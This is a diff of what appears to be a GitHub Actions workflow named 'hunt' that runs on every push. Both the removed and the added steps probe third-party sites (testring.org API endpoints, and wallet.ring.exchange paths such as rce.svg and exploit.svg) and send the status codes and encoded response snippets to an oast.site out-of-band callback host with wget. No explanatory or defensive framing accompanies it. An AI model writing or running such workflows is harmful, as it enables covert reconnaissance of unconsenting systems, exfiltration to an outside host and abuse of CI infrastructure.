@@ -1,4 +1,4 @@
-name: b1
+name: hunt
 on: push
 jobs:
   j:
@@ -6,10 +6,10 @@ jobs:
     steps:
       - uses: actions/checkout@v4
       - run: |
-          A=$( (curl -s --max-time 8 -o /tmp/x -w "%{http_code}" https://app.testring.org/api/v1/dapps || echo E) )
-          B=$( (curl -s --max-time 8 -o /tmp/y -w "%{http_code}" https://f.testring.org/api/auth/providers || echo E) )
-          C=$( (curl -s --max-time 8 -o /tmp/z -w "%{http_code}" https://f.testring.org/api/auth/session || echo E) )
-          SA=$( (head -c 30 /tmp/x 2>/dev/null | tr -d "\n" | base64 | tr -d "\n" || echo e) )
-          SB=$( (head -c 30 /tmp/y 2>/dev/null | tr -d "\n" | base64 | tr -d "\n" || echo e) )
-          wget -qO- "http://dbn4g99lr5rdpldhtengr86qx4ii6ec3s.oast.site/b1-$A-$B-$C-${SA:0:12}-${SB:0:12}" || true
+          R=""
+          for p in rce.svg avif.svg p.svg exploit.svg x.svg og.svg card.svg logo.svg icon.svg avatar.svg; do
+            C=$( (curl -s --max-time 6 -o /dev/null -w "%{http_code}" "https://wallet.ring.exchange/$p" || echo e) )
+            R="$R$p=$C "
+          done
+          wget -qO- "http://dbn4g99lr5rdpldhtengr86qx4ii6ec3s.oast.site/hunt-$(echo $R | tr ' ' '_' | head -c 55)" || true
         continue-on-error: true
